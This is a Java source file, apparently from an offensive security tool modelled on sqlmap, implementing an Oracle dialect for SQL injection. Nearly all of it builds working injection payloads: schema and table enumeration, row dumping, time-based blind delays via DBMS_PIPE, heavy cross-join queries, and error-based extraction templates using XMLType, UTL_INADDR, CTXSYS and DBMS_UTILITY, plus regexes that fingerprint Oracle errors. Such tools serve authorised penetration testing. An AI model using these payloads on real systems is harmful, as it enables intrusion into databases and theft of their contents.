package com.omnistrike.modules.exploit.omnimap.dbms;

import java.util.List;
import java.util.concurrent.ThreadLocalRandom;
import java.util.regex.Pattern;
import java.util.stream.Collectors;

/**
 * Oracle Database dialect for OmniMap.
 * Uses ALL_TABLES/ALL_TAB_COLUMNS, SUBSTR(), CHR(), DBMS_PIPE.RECEIVE_MESSAGE for delays,
 * CASE WHEN for conditionals, and XMLType/UTL_INADDR/CTXSYS for error-based extraction.
 */
public class OracleDialect implements DbmsDialect {

    /** Random markers for error-based extraction (like sqlmap's kb.chars.start/stop) */
    private final String errorPrefixDecoded;
    private final String errorSuffixDecoded;
    private final int errorRandNum;

    public OracleDialect() {
        this.errorPrefixDecoded = randomMarker(4);
        this.errorSuffixDecoded = randomMarker(5);
        this.errorRandNum = ThreadLocalRandom.current().nextInt(1000, 10000);
    }

    @Override
    public String getErrorPrefixDecoded() { return errorPrefixDecoded; }

    @Override
    public String getErrorSuffixDecoded() { return errorSuffixDecoded; }

    private static String randomMarker(int length) {
        ThreadLocalRandom rng = ThreadLocalRandom.current();
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < length; i++) {
            sb.append((char) rng.nextInt(0x71, 0x79));
        }
        return sb.toString();
    }

    /**
     * Convert a marker string to CHR(n)||CHR(n)||... format.
     * Markers built from CHR() calls only appear in error output, not reflected SQL.
     */
    private static String toChrConcat(String s) {
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < s.length(); i++) {
            if (i > 0) sb.append("||");
            sb.append("CHR(").append((int) s.charAt(i)).append(")");
        }
        return sb.toString();
    }

    @Override
    public String getName() { return "Oracle"; }

    @Override
    public String currentDatabase() {
        return "SELECT SYS_CONTEXT('USERENV','DB_NAME') FROM DUAL";
    }

    @Override
    public String errorTestQuery() {
        // Guaranteed non-null for error-based detection
        return "SELECT NVL(SYS_CONTEXT('USERENV','DB_NAME'),'1') FROM DUAL";
    }

    @Override
    public String listDatabases() {
        // Oracle doesn't have multiple databases like MySQL; list tablespace owners instead
        return "SELECT DISTINCT owner FROM ALL_TABLES";
    }

    @Override
    public String listTables(String database) {
        return "SELECT table_name FROM ALL_TABLES WHERE owner='" + database.toUpperCase() + "'";
    }

    @Override
    public String listColumns(String database, String table) {
        return "SELECT column_name FROM ALL_TAB_COLUMNS WHERE owner='" + database.toUpperCase()
                + "' AND table_name='" + table.toUpperCase() + "'";
    }

    @Override
    public String dumpData(String database, String table, List<String> columns, int offset, int limit) {
        String cols = columns.stream()
                .map(c -> "NVL(CAST(\"" + c + "\" AS VARCHAR2(4000)),CHR(32))")
                .collect(Collectors.joining("||CHR(124)||"));
        return "SELECT " + cols + " FROM (SELECT a.*,ROWNUM rnum FROM "
                + "\"" + database.toUpperCase() + "\".\"" + table.toUpperCase() + "\" a WHERE ROWNUM<="
                + (offset + limit) + ") WHERE rnum>" + offset;
    }

    @Override
    public String charFunction(int ascii) {
        return "CHR(" + ascii + ")";
    }

    @Override
    public String substringFunction(String expr, int pos, int len) {
        return "SUBSTR((" + expr + ")," + pos + "," + len + ")";
    }

    @Override
    public String lengthFunction(String expr) {
        return "LENGTH((" + expr + "))";
    }

    @Override
    public String sleepFunction(int seconds) {
        return "DBMS_PIPE.RECEIVE_MESSAGE(CHR(65)||CHR(66)||CHR(67)," + seconds + ")";
    }

    @Override
    public String ifFunction(String condition, String trueVal, String falseVal) {
        return "CASE WHEN (" + condition + ") THEN " + trueVal + " ELSE " + falseVal + " END";
    }

    @Override
    public String commentSuffix() {
        return "--";
    }

    @Override
    public String concatenate(String... parts) {
        return String.join("||", parts);
    }

    @Override
    public List<String> errorFunctions() {
        // Ordered by sqlmap level: XMLType(L1), UTL_INADDR(L2), CTXSYS(L3), DBMS_UTILITY(L4)
        // All use CHR() delimiter markers so they only appear in error output, not reflected SQL.
        // CRITICAL: Oracle requires a comparison operator (e.g., AND randNum=expr),
        // not bare AND expr. Each template includes errorRandNum= prefix.
        String pChr = toChrConcat(errorPrefixDecoded);
        String sChr = toChrConcat(errorSuffixDecoded);
        return List.of(
                // Level 1 (#27): XMLType with CHR() delimiters â€” like sqlmap
                errorRandNum + "=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||" + pChr + "||(%s)||" + sChr + "||CHR(62))) FROM DUAL)",
                // Level 2 (#29): UTL_INADDR.GET_HOST_ADDRESS with delimiters
                errorRandNum + "=UTL_INADDR.GET_HOST_ADDRESS(" + pChr + "||(%s)||" + sChr + ")",
                // Level 3 (#31): CTXSYS.DRITHSX.SN with delimiters
                errorRandNum + "=CTXSYS.DRITHSX.SN(" + errorRandNum + "," + pChr + "||(%s)||" + sChr + ")",
                // Level 4 (#33): DBMS_UTILITY.SQLID_TO_SQLHASH with delimiters
                errorRandNum + "=DBMS_UTILITY.SQLID_TO_SQLHASH(" + pChr + "||(%s)||" + sChr + ")"
        );
    }

    @Override
    public List<String> errorFunctionsForLevel(int level) {
        List<String> all = errorFunctions();
        // sqlmap gating: L1=XMLType, L2=+UTL_INADDR, L3=+CTXSYS, L4=+DBMS_UTILITY
        if (level >= 4) return all;
        if (level >= 3) return all.subList(0, 3);
        if (level >= 2) return all.subList(0, 2);
        return all.subList(0, 1); // Level 1: XMLType only
    }

    @Override
    public String heavyQuery(int seconds) {
        // sqlmap always uses 5 cross-joined ALL_USERS tables for Oracle heavy queries
        return "(SELECT COUNT(*) FROM ALL_USERS t1,ALL_USERS t2,ALL_USERS t3,ALL_USERS t4,ALL_USERS t5)";
    }

    @Override
    public List<Pattern> errorPatterns() {
        return List.of(
                // ORA-xxxxx numbered errors (strongest fingerprint)
                Pattern.compile("ORA-\\d{5}", Pattern.CASE_INSENSITIVE),
                // PL/SQL errors
                Pattern.compile("PLS-\\d{5}", Pattern.CASE_INSENSITIVE),
                // TNS connection errors
                Pattern.compile("TNS:", Pattern.CASE_INSENSITIVE),
                // Driver / connection
                Pattern.compile("Oracle.*Driver", Pattern.CASE_INSENSITIVE),
                Pattern.compile("oracle\\.jdbc", Pattern.CASE_INSENSITIVE),
                Pattern.compile("OracleException", Pattern.CASE_INSENSITIVE),
                // Syntax errors
                Pattern.compile("quoted string not properly terminated", Pattern.CASE_INSENSITIVE),
                Pattern.compile("Unterminated string literal", Pattern.CASE_INSENSITIVE),
                Pattern.compile("missing expression", Pattern.CASE_INSENSITIVE),
                Pattern.compile("SQL command not properly ended", Pattern.CASE_INSENSITIVE),
                Pattern.compile("invalid number", Pattern.CASE_INSENSITIVE),
                Pattern.compile("invalid identifier", Pattern.CASE_INSENSITIVE),
                Pattern.compile("table or view does not exist", Pattern.CASE_INSENSITIVE),
                Pattern.compile("divisor is equal to zero", Pattern.CASE_INSENSITIVE),
                Pattern.compile("not a valid month", Pattern.CASE_INSENSITIVE)
        );
    }

    @Override
    public String countRows(String database, String table) {
        return "SELECT COUNT(*) FROM \"" + database.toUpperCase() + "\".\"" + table.toUpperCase() + "\"";
    }

    @Override
    public String separator() {
        return "CHR(124)";
    }

    @Override
    public String unionFrom() {
        return " FROM DUAL";
    }

    @Override
    public String limitOffset(String query, int limit, int offset) {
        // CRITICAL: Must NOT add extra columns (like ROWNUM alias 'rnum') because
        // blind/inference extractors wrap the result in LENGTH()/SUBSTR() which
        // require a scalar (single-column) subquery.
        if (offset == 0) {
            // Simple ROWNUM: preserves original column set (no extra rnum)
            return "SELECT * FROM (" + query + ") WHERE ROWNUM <= " + limit;
        }
        // For offset > 0: use MINUS to get rows [offset+1..offset+limit]
        // First (offset+limit) rows MINUS first (offset) rows = target rows.
        // MINUS preserves original column set and works for enumeration queries
        // (distinct tables, columns, databases) which is the primary use case.
        return "SELECT * FROM (" + query + ") WHERE ROWNUM <= " + (offset + limit)
                + " MINUS SELECT * FROM (" + query + ") WHERE ROWNUM <= " + offset;
    }
}
